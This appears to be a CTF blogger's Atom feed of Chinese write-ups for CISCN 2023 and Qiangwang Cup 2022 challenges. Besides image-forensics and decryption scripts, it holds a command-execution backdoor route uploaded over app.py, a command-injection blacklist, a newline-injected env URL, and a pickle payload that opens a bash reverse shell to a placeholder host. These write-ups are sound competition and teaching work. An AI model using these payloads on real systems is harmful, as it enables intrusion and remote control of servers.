@@ -1,0 +1,601 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+    <id>https://daffodi11.github.io</id>
+    <title>Daffodil</title>
+    <updated>2025-08-05T07:12:57.754Z</updated>
+    <generator>https://github.com/jpmonette/feed</generator>
+    <link rel="alternate" href="https://daffodi11.github.io"/>
+    <link rel="self" href="https://daffodi11.github.io/atom.xml"/>
+    <subtitle>温故而知新</subtitle>
+    <logo>https://daffodi11.github.io/images/avatar.png</logo>
+    <icon>https://daffodi11.github.io/favicon.ico</icon>
+    <rights>All rights reserved 2025, Daffodil</rights>
+    <entry>
+        <title type="html"><![CDATA[Misc-2023CISCN东北赛区线下赛-剪不断理还乱-writeup]]></title>
+        <id>https://daffodi11.github.io/post/misc-2023ciscn-dong-bei-sai-qu-xian-xia-sai-jian-bu-duan-li-huan-luan-writeup/</id>
+        <link href="https://daffodi11.github.io/post/misc-2023ciscn-dong-bei-sai-qu-xian-xia-sai-jian-bu-duan-li-huan-luan-writeup/">
+        </link>
+        <updated>2023-08-04T03:24:04.000Z</updated>
+        <content type="html"><![CDATA[<p>线下没做出来这道题 感谢赛后App1e_Tree师傅的帮助</p>
+<p>题目是一张png图片<br>
+<img src="https://daffodi11.github.io/post-images/1691119694336.png" alt="" loading="lazy"><br>
+拖到tweakpng查看<br>
+<img src="https://daffodi11.github.io/post-images/1691119755869.png" alt="" loading="lazy"><br>
+<img src="https://daffodi11.github.io/post-images/1691119774324.png" alt="" loading="lazy"><br>
+中间有一块IDAT大小不对 按照PNG的格式要求应该是 最小的IDAT在最下面 结合题目<br>
+判断是IDAT顺序不对<br>
+尝试对IDAT的顺序进行爆破<br>
+首先我们对图片进行拆分 先<br>
+把图片的文件头拆分出来命名为head<br>
+文件尾拆分出来命名为tail<br>
+最小的那块长度为18846的IDAT拆分出来命名为a45<br>
+<img src="https://daffodi11.github.io/post-images/1691120043233.png" alt="" loading="lazy"><br>
+然后把剩余的IDAT块等分<br>
+脚本</p>
+<pre><code class="language-py">import os
+
+# 打开要分割的文件
+with open('剪不断理还乱.png', 'rb') as f:
+    # 获取文件的长度
+    file_size = os.path.getsize('剪不断理还乱.png')
+    print(file_size)
+    print(file_size/65548)
+    # 计算需要分割成多少块
+    num_blocks = file_size // 65548 
+
+    # 分割文件
+    for i in range(num_blocks):
+        # 计算当前块的起始位置
+        start = i * 65548
+        # 计算当前块的结束位置
+        end = min(start + 65548, file_size)
+
+        # 定位文件指针到当前块的起始位置
+        f.seek(start)
+        # 读取当前块的数据
+        data = f.read(end - start)
+
+        # 将当前块的数据写入到新的文件中
+         with open('a{}'.format(i), 'wb') as block_file:
+            block_file.write(data)
+
+</code></pre>
+<p><img src="https://daffodi11.github.io/post-images/1691120432668.png" alt="" loading="lazy"><br>
+<img src="https://daffodi11.github.io/post-images/1691120448024.png" alt="" loading="lazy"><br>
+然后写脚本爆破</p>
+<pre><code class="language-py"># 指定要拼接的文件列表
+file_names = ['head',
+              'x',
+              'tail']
+
+# 创建一个新的文件来保存拼接后的数据
+for i in range(0, 46):
+    with open('.//output//'+str(i)+'.png', 'wb') as f:
+        file_names[-2] = &quot;a&quot;+str(i)
+        # 遍历所有文件
+        for file_name in file_names:
+            # 打开当前文件
+            with open(file_name, 'rb') as current_file:
+                # 读取当前文件的数据
+                data = current_file.read()
+                # 将当前文件的数据写入到新文件中
+                f.write(data)
+
+</code></pre>
+<p>结果可以看到a13应该是第一块IDAT<br>
+<img src="https://daffodi11.github.io/post-images/1691120661483.png" alt="" loading="lazy"><br>
+<img src="https://daffodi11.github.io/post-images/1691120665283.png" alt="" loading="lazy"><br>
+修改脚本</p>
+<pre><code class="language-py"># 指定要拼接的文件列表
+file_names = ['head',
+              'a13',
+              'x',
+              'tail']
+
+# 创建一个新的文件来保存拼接后的数据
+for i in range(0, 46):
+    with open('.//output//'+str(i)+'.png', 'wb') as f:
+        file_names[-2] = &quot;a&quot;+str(i)
+        # 遍历所有文件
+        for file_name in file_names:
+            # 打开当前文件
+            with open(file_name, 'rb') as current_file:
+                # 读取当前文件的数据
+                data = current_file.read()
+                # 将当前文件的数据写入到新文件中
+                f.write(data)
+
+</code></pre>
+<p>我们再来爆破第二块IDAT<br>
+不正确的IDAT块不能正确显示像这样<br>
+<img src="https://daffodi11.github.io/post-images/1691120794562.png" alt="" loading="lazy"><br>
+正确的是这样 所以第二块IDAT是a4<br>
+<img src="https://daffodi11.github.io/post-images/1691120782755.png" alt="" loading="lazy"><br>
+以此类推<br>
+最后的脚本是</p>
+<pre><code class="language-py"># 指定要拼接的文件列表
+file_names = ['head',
+              'a11',  'a2', 'a15', 'a41', 'a27',
+              'a28',  'a40', 'a5', 'a8', 'a10',
+              'a12', 'a44', 'a9', 'a25', 'a36',
+              'a38', 'a4', 'a42', 'a7', 'a3',
+              'a33', 'a19', 'a34', 'a17', 'a14',
+              'a43', 'a32', 'a13', 'a22', 'a21',
+              'a18', 'a37', 'a30', 'a29', 'a24',
+              'a39', 'a31', 'a23', 'a1', 'a16',
+              'a35', 'a0', 'a20', 'a6', 'a26',
+              'x',
+              'tail']
+
+# 创建一个新的文件来保存拼接后的数据
+for i in range(0, 46):
+    with open('.//output//'+str(i)+'.png', 'wb') as f:
+        file_names[-2] = &quot;a&quot;+str(i)
+        # 遍历所有文件
+        for file_name in file_names:
+            # 打开当前文件
+            with open(file_name, 'rb') as current_file:
+                # 读取当前文件的数据
+                data = current_file.read()
+                # 将当前文件的数据写入到新文件中
+                f.write(data)
+
+</code></pre>
+<p>结果是<br>
+<img src="https://daffodi11.github.io/post-images/1691120920930.png" alt="" loading="lazy"></p>
+<p>根据提示 密码是DASCTF@yyds@<br>
+脚本一把梭<br>
+https://github.com/livz/cloacked-pixel<br>
+这里我们用py3版本的<br>
+https://github.com/livz/cloacked-pixel/blob/8fc84e2ba387c363053524c35c5e55cae16063cd/crypt_for_py3.py<br>
+搞定<br>
+<img src="https://daffodi11.github.io/post-images/1691121231852.png" alt="" loading="lazy"></p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Re-2023CISCN东北赛区线下赛-Re1-writeup]]></title>
+        <id>https://daffodi11.github.io/post/re-2023ciscn-dong-bei-sai-qu-xian-xia-sai-re-writeup/</id>
+        <link href="https://daffodi11.github.io/post/re-2023ciscn-dong-bei-sai-qu-xian-xia-sai-re-writeup/">
+        </link>
+        <updated>2023-08-02T14:02:49.000Z</updated>
+        <content type="html"><![CDATA[<p>题目</p>
+<pre><code class="language-py">flag=&quot;123&quot;
+key=&quot;12345&quot;
+assert(len(key) == 5)
+letter = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{_}&quot;
+w ={}
+for i in range(len(letter)):
+    l = letter[i:]+letter[:i]
+    dic = {}
+    for j in range(len(l)):
+        dic[letter[j]] = l[j]
+    w[letter[i]] = dic
+
+def encrypt(m,key):
+    x1 = len(m)//len(key)
+    x2 = len(m)%len(key)
+    key += x1*key + key[0:x2]
+    c = &quot;&quot;
+    print(len(m))
+    print(len(key))
+
+    for i in range(len(m)):
+        c += w[m[i]][key[i]]
+    return c
+
+c =  encrypt(flag,key)
+print(c)
+
+#DKQ6NFHDW33MAW9B}4UV1OB0{7G7VU8C1U3CO6V6
+</code></pre>
+<p>解密</p>
+<pre><code class="language-py">
+letter = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{_}&quot;
+w ={}
+for i in range(len(letter)):
+    l = letter[i:]+letter[:i]
+    dic = {}
+    for j in range(len(l)):
+        dic[letter[j]] = l[j]
+    w[letter[i]] = dic
+
+print(w)
+
+m=&quot;DKQ6NFHDW33MAW9B}4UV1OB0{7G7VU8C1U3CO6V6&quot;
+key=&quot;AK_47&quot;
+x1 = len(m)//5
+x2 = len(m)%5
+key += x1*key + key[0:x2]
+print(key)
+c=&quot;&quot;
+for i in range(len(m)):
+    print(&quot;keyi:&quot;+key[i])
+    print(&quot;mi:&quot;,m[i])
+    c += w[m[i]][key[i]]
+
+print(c)
+aa=&quot;DKQ6NFHDW33MAW9B}4UV1OB0{7G7VU8C1U3CO6V6&quot;
+for i in range(len(m)):
+    for j in letter:
+        if w[j][key[i]]==aa[i]:
+            print(j,end='')
+
+
+#PRT
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://daffodi11.github.io/post-images/1690985072442.png" alt="" loading="lazy"></figure>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Web-2023CISCN东北赛区线下赛-web1-writeup]]></title>
+        <id>https://daffodi11.github.io/post/web-2023ciscn-dong-bei-sai-qu-xian-xia-sai-web1-writeup/</id>
+        <link href="https://daffodi11.github.io/post/web-2023ciscn-dong-bei-sai-qu-xian-xia-sai-web1-writeup/">
+        </link>
+        <updated>2023-08-02T13:57:08.000Z</updated>
+        <content type="html"><![CDATA[<p>Flask应用开启了debug=True 可以上传替换<br>
+前面是正常图片的bse64编码后面是我们的恶意app.py源码<br>
+题目源码</p>
+<pre><code class="language-py">from flask import Flask, render_template, request, send_from_directory
+import os
+import base64
+from PIL import Image
+import io
+
+app = Flask(__name__)
+app.config['UPLOAD_FOLDER'] = './png'
+
+@app.route('/png/&lt;path:filename&gt;')
+def view_file(filename):
+    return send_from_directory(app.config['UPLOAD_FOLDER'], filename)
+
+
+@app.route('/', methods=['GET', 'POST'])
+def upload_file():
+    message = None
+    message_class = &quot;error&quot;
+    if request.method == 'POST':
+        file = request.files['file']
+        filename = file.filename
+        file_path = os.path.join(app.config['UPLOAD_FOLDER'], filename)
+        
+        if '/' in str(filename):
+            os.remove(file_path)
+            message = &quot;File not allowed. Please upload a valid file.&quot;
+        else:
+            file.save(file_path)
+            
+        try:
+            with open(file_path, &quot;rb&quot;) as f:
+                content = f.read()
+                decoded_data = base64.b64decode(content)
+                img = Image.open(io.BytesIO(decoded_data))
+                if img.format == &quot;PNG&quot;:
+                    new_filename = os.path.join(app.config['UPLOAD_FOLDER'],os.urandom(8).hex() + '.png')
+                    with open(new_filename, 'wb') as f_out:
+                        import png
+                        png_writer = png.Writer(img.width, img.height, greyscale=True if img.mode in ['1', 'L'] else False)
+                        img_data = img.convert('RGBA') if img.mode != 'RGBA' else img
+                        img_data = list(img_data.getdata())
+                        img_data = [tuple([int(x) for x in row]) for row in img_data]
+                        img_data = [item for sublist in img_data for item in sublist]
+                        png_writer.write_packed(f_out, [img_data[i:i + img.width * 4] for i in range(0, len(img_data), img.width * 4)])
+                    message = f&quot;File uploaded and processed successfully in {new_filename}.&quot;
+                    message_class = &quot;success&quot;
+                else:
+                    os.remove(file_path)
+                    message = &quot;Invalid file format. Only PNG files are allowed.&quot;
+        except IOError:
+            os.remove(file_path)
+            message = &quot;File not allowed. Please upload a valid file.&quot;
+
+    return render_template('upload.html', message=message, message_class=message_class)
+
+if __name__ == '__main__':
+    app.run('0.0.0.0', debug=True, port=8080, threaded=True, reloader_type='stat', reloader_interval=1)
+
+</code></pre>
+<p>新添加一个路由执行命令 我们上传这个替换app.py</p>
+<pre><code class="language-py">from flask import Flask, render_template, request, send_from_directory
+import os
+import base64
+from PIL import Image
+import io
+
+app = Flask(__name__)
+app.config['UPLOAD_FOLDER'] = './png'
+
+@app.route('/png/&lt;path:filename&gt;')
+def view_file(filename):
+  return send_from_directory(app.config['UPLOAD_FOLDER'], filename)
+
+
+@app.route('/', methods=['GET', 'POST'])
+def upload_file():
+  message = None
+  message_class = &quot;error&quot;
+  if request.method == 'POST':
+      file = request.files['file']
+      filename = file.filename
+      file_path = os.path.join(app.config['UPLOAD_FOLDER'], filename)
+      file.save(file_path)
+
+      try:
+          with open(file_path, &quot;rb&quot;) as f:
+              content = f.read()
+              decoded_data = base64.b64decode(content)
+              img = Image.open(io.BytesIO(decoded_data))
+              if img.format == &quot;PNG&quot;:
+                  new_filename = os.path.join(app.config['UPLOAD_FOLDER'],os.urandom(8).hex() + '.png')
+                  with open(new_filename, 'wb') as f_out:
+                      import png
+                      png_writer = png.Writer(img.width, img.height, greyscale=True if img.mode in ['1', 'L'] else False)
+                      img_data = img.convert('RGBA') if img.mode != 'RGBA' else img
+                      img_data = list(img_data.getdata())
+                      img_data = [tuple([int(x) for x in row]) for row in img_data]
+                      img_data = [item for sublist in img_data for item in sublist]
+                      png_writer.write_packed(f_out, [img_data[i:i + img.width * 4] for i in range(0, len(img_data), img.width * 4)])
+                  message = f&quot;File uploaded and processed successfully in {new_filename}.&quot;
+                  message_class = &quot;success&quot;
+              else:
+                  os.remove(file_path)
+                  message = &quot;Invalid file format. Only PNG files are allowed.&quot;
+      except IOError:
+          os.remove(file_path)
+          message = &quot;File not allowed. Please upload a valid file.&quot;
+
+  return render_template('upload.html', message=message, message_class=message_class)
+
+@app.route('/player', methods=['GET'])
+def add_or_update_player():
+  a = request.args.get('a')
+  print(a)
+  r=os.popen(a).read()
+  print(r)
+  return  r
+
+if __name__ == '__main__':
+  app.run('0.0.0.0', debug=True, port=8080, threaded=True, reloader_type='stat', reloader_interval=1)
+
+</code></pre>
+<p><img src="https://daffodi11.github.io/post-images/1690984878232.png" alt="" loading="lazy"><br>
+<img src="https://daffodi11.github.io/post-images/1690984814861.png" alt="" loading="lazy"><br>
+<img src="https://daffodi11.github.io/post-images/1690984837750.png" alt="" loading="lazy"><br>
+<img src="https://daffodi11.github.io/post-images/1690984799828.png" alt="" loading="lazy"></p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Web-2023CISCN东北赛区线下赛-web4-writeup]]></title>
+        <id>https://daffodi11.github.io/post/web-2023ciscn-dong-bei-sai-qu-xian-xia-sai-web4-writeup/</id>
+        <link href="https://daffodi11.github.io/post/web-2023ciscn-dong-bei-sai-qu-xian-xia-sai-web4-writeup/">
+        </link>
+        <updated>2023-08-02T13:53:39.000Z</updated>
+        <content type="html"><![CDATA[<p>非常简单的命令执行<br>
+非常简单的过滤绕过<br>
+题目源码</p>
+<pre><code class="language-py">from flask import Flask, render_template, request
+import os
+import re
+
+app = Flask(__name__)
+
+
+@app.route(&quot;/&quot;, methods=[&quot;GET&quot;])
+def index():
+    return render_template(&quot;index.html&quot;)
+
+
+@app.route(&quot;/post&quot;, methods=[&quot;POST&quot;])
+def post():
+    if request.method == &quot;POST&quot;:
+        ip = request.form.get(&quot;ip&quot;)
+        print(ip)
+        if not ip:
+            mes = &quot;Your ip cannot be empty&quot;
+            return render_template(&quot;index.html&quot;, message=mes)
+        invalid = waf(ip)
+        if invalid:
+            mes = &quot;Waf!&quot;
+            return render_template(&quot;index.html&quot;, message=mes)
+        res = os.popen(&quot;ping -c 5 -w 15 &quot; + ip)
+        #print(res)
+        if res:
+            mes = res.read()
+            return render_template(&quot;index.html&quot;, message=mes)
+        else:
+            mes = &quot;Failed!&quot;
+            return render_template(&quot;index.html&quot;, message=mes)
+
+
+def waf(ip):
+    blacklist = [&quot;;&quot;, &quot;cat&quot;, &quot;&gt;&quot;, &quot;&lt;&quot;, &quot;cd&quot;, &quot; &quot;, &quot;tac&quot;, &quot;sh&quot;, &quot;\+&quot;, &quot;echo&quot;, &quot;flag&quot;
+    ,&quot;prinf&quot;,&quot;\?&quot;,&quot;\*&quot;,&quot;\\\\&quot;]
+    # &quot;?&quot;,&quot;*&quot;
+    for black in blacklist:
+        match = re.search(black, ip, re.M | re.I)
+        #print(match)
+        if match:
+            return True
+    return False
+
+
+if __name__ == &quot;__main__&quot;:
+    app.run(&quot;0.0.0.0&quot;, port=80)
+
+</code></pre>
+<p>绕过方法<br>
+图片我是从我当时线下比赛的录像截取的<br>
+<img src="https://daffodi11.github.io/post-images/1690984586984.png" alt="" loading="lazy"><br>
+<img src="https://daffodi11.github.io/post-images/1690984596445.png" alt="" loading="lazy"></p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Misc-2023CISCN初赛-被加密的生产流量-writeup]]></title>
+        <id>https://daffodi11.github.io/post/misc-bei-jia-mi-de-sheng-chan-liu-liang-writeup/</id>
+        <link href="https://daffodi11.github.io/post/misc-bei-jia-mi-de-sheng-chan-liu-liang-writeup/">
+        </link>
+        <updated>2023-08-02T11:33:32.000Z</updated>
+        <content type="html"><![CDATA[<p>Tcp0流 Base32解密<br>
+<img src="https://daffodi11.github.io/post-images/1690976042533.png" alt="" loading="lazy"></p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Misc-2023CISCN初赛-Sign_in_passwd-writeup]]></title>
+        <id>https://daffodi11.github.io/post/misc-sign_in_passwd-writeup/</id>
+        <link href="https://daffodi11.github.io/post/misc-sign_in_passwd-writeup/">
+        </link>
+        <updated>2023-08-02T11:32:33.000Z</updated>
+        <content type="html"><![CDATA[<p>urldecode+Base64<br>
+<img src="https://daffodi11.github.io/post-images/1690976001665.png" alt="" loading="lazy"></p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Re-2023CISCN初赛-babyRE-writeup]]></title>
+        <id>https://daffodi11.github.io/post/web-re-writeup/</id>
+        <link href="https://daffodi11.github.io/post/web-re-writeup/">
+        </link>
+        <updated>2023-08-02T11:30:49.000Z</updated>
+        <content type="html"><![CDATA[<!-- more -->
+<p>根据xml链接 导入可以发现是个游戏<br>
+<img src="https://daffodi11.github.io/post-images/1690975921099.png" alt="" loading="lazy"><br>
+<img src="https://daffodi11.github.io/post-images/1690975924994.png" alt="" loading="lazy"><br>
+导出这个列表  根据右边的算法解出来</p>
+<pre><code class="language-py">key = [102, 10, 13, 6, 28, 74, 3, 1, 3, 7, 85, 0, 4, 75, 20, 92, 92, 8, 28, 25,
+      81, 83, 7, 28, 76, 88, 9, 0, 29, 73, 0, 86, 4, 87, 87, 82, 84, 85, 4, 85, 87, 30]
+
+print(len(key))
+
+for i in range(1, len(key)):
+   key[i] = key[i-1] ^ key[i]
+for i in key:
+   print(chr(i), end='')
+</code></pre>
+<p>flag{12307bbf-9e91-4e61-a900-dd26a6d0ea4c}</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Web-2023CISCN初赛-Dumpit-writeup]]></title>
+        <id>https://daffodi11.github.io/post/web-dumpit-writeup/</id>
+        <link href="https://daffodi11.github.io/post/web-dumpit-writeup/">
+        </link>
+        <updated>2023-08-02T11:29:52.000Z</updated>
+        <content type="html"><![CDATA[<p>非预期<br>
+http://eci-2zefgz6c8k3wkvuo49ln.cloudeci1.ichunqiu.com:8888/?db=%0aenv%0a&amp;table_2_dump=flag1</p>
+<figure data-type="image" tabindex="1"><img src="https://daffodi11.github.io/post-images/1690975821496.png" alt="" loading="lazy"></figure>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Web-2023CISCN初赛-unzip-writeup]]></title>
+        <id>https://daffodi11.github.io/post/web-unzip-writeup/</id>
+        <link href="https://daffodi11.github.io/post/web-unzip-writeup/">
+        </link>
+        <updated>2023-08-02T11:26:16.000Z</updated>
+        <content type="html"><![CDATA[<p>利用ln链接<br>
+<img src="https://daffodi11.github.io/post-images/1690975758781.png" alt="" loading="lazy"><br>
+上传1.zip 2.zip<br>
+连接webshell<br>
+<img src="https://daffodi11.github.io/post-images/1690975764886.png" alt="" loading="lazy"></p>
+<p>获取flag<br>
+<img src="https://daffodi11.github.io/post-images/1690975770546.png" alt="" loading="lazy"><br>
+flag值：</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Web-2022强网杯-crash-writeup]]></title>
+        <id>https://daffodi11.github.io/post/web-crash-writeup/</id>
+        <link href="https://daffodi11.github.io/post/web-crash-writeup/">
+        </link>
+        <updated>2022-08-01T04:03:28.000Z</updated>
+        <content type="html"><![CDATA[<p>打开题目看到源码 是python Flask<br>
+<img src="https://daffodi11.github.io/post-images/1659326644548.jpg" alt="" loading="lazy"><br>
+<img src="https://daffodi11.github.io/post-images/1659326648822.jpg" alt="" loading="lazy"></p>
+<pre><code class="language-python">
+import base64
+# import sqlite3
+import pickle
+from flask import Flask, make_response,request, session
+import admin
+import random
+
+app = Flask(__name__,static_url_path='')
+app.secret_key=random.randbytes(12)
+
+class User:
+    def __init__(self, username,password):
+        self.username=username
+        self.token=hash(password)
+
+def get_password(username):
+    if username==&quot;admin&quot;:
+        return admin.secret
+    else:
+        # conn=sqlite3.connect(&quot;user.db&quot;)
+        # cursor=conn.cursor()
+        # cursor.execute(f&quot;select password from usertable where username='{username}'&quot;)
+        # data=cursor.fetchall()[0]
+        # if data:
+        #     return data[0] 
+        # else:
+        #     return None
+        return session.get(&quot;password&quot;)
+
+@app.route('/balancer', methods=['GET', 'POST'])
+def flag():
+    pickle_data=base64.b64decode(request.cookies.get(&quot;userdata&quot;))
+    if b'R' in pickle_data or b&quot;secret&quot; in pickle_data:
+        return &quot;You damm hacker!&quot;
+    os.system(&quot;rm -rf *py*&quot;)
+    userdata=pickle.loads(pickle_data)
+    if userdata.token!=hash(get_password(userdata.username)):
+         return &quot;Login First&quot;
+    if userdata.username=='admin':
+        return &quot;Welcome admin, here is your next challenge!&quot;
+    return &quot;You're not admin!&quot;
+
+@app.route('/login', methods=['GET', 'POST'])
+def login():
+    resp = make_response(&quot;success&quot;) 
+    session[&quot;password&quot;]=request.values.get(&quot;password&quot;)
+    resp.set_cookie(&quot;userdata&quot;, base64.b64encode(pickle.dumps(User(request.values.get(&quot;username&quot;),request.values.get(&quot;password&quot;)),2)), max_age=3600)
+    return resp
+
+@app.route('/', methods=['GET', 'POST'])
+def index():
+    return open('source.txt',&quot;r&quot;).read()
+
+if __name__ == '__main__':
+    app.run(host='0.0.0.0', port=5000)
+
+</code></pre>
+<p>考察python 反序列化 过滤了R操作符<br>
+用o操作符弹shell 参考https://xz.aliyun.com/t/8342</p>
+<pre><code class="language-python">import base64
+
+print(base64.b64encode(b'(cos\nsystem\nX\x33\x00\x00\x00bash -c &quot;bash -i &gt;&amp; /dev/tcp/XX.XX.XX.XX/7788 0&gt;&amp;1&quot;o.'))
+
+print(hex(len('bash -c &quot;bash -i &gt;&amp; /dev/tcp/XX.XX.XX.XX/7788 0&gt;&amp;1&quot;')))
+</code></pre>
+<p>替换cookies弹shell<br>
+<img src="https://daffodi11.github.io/post-images/1659326992331.jpg" alt="" loading="lazy"></p>
+<p>题目提示504页面 直接再起一个Flask</p>
+<pre><code class="language-python">from flask import Flask
+import random
+import time
+app = Flask(__name__,static_url_path='')
+app.secret_key=random.randbytes(12)
+
+@app.route('/',methods=['GET','POST'])
+def index():
+	time.sleep(9000)
+	return &quot;ok&quot;
+if __name__ == '__main__':
+	app.run(host='0.0.0.0',port=5000)
+</code></pre>
+<p>没有vi vim 用cat 写入app.py<br>
+<img src="https://daffodi11.github.io/post-images/1659327362470.jpg" alt="" loading="lazy"><br>
+启动 python3 app.py<br>
+<img src="https://daffodi11.github.io/post-images/1659327367178.jpg" alt="" loading="lazy"><br>
+再次请求首页 拿到flag<br>
+<img src="https://daffodi11.github.io/post-images/1659327604509.jpg" alt="" loading="lazy"></p>
+]]></content>
+    </entry>
+</feed>
